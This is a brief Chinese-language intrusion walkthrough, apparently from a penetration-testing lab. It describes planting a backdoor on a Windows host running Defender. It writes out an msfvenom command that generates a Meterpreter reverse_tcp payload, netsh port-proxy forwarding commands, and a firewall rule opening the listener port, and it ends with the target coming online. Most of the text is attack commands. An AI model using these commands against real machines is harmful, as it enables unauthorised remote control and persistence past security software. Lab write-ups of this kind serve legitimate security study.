既然这样可行，那么上传一个后门，使用msf正向连接

首先看一下是否存在杀软

使用杀软识别，存在了windows defender，正向msf需要免杀

由于存在杀软，正向连接和反向连接都不通，那么使用端口转发操作，使这台机器上线

端口转发

生成msf木马

msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=10.0.20.98 lport=7788 -fc

端口转发

netsh interface portproxy add v4tov4 listenport=5555

connectaddress=192.168.10.162 connectport=5555

添加入站规则

netsh advfirewall firewall add rule name="7788" protocol=TCP dir=in

localport=7788 action=allow

查看入站规则

netsh interface portproxy show all

成功上线，这上线折磨了我1个小时
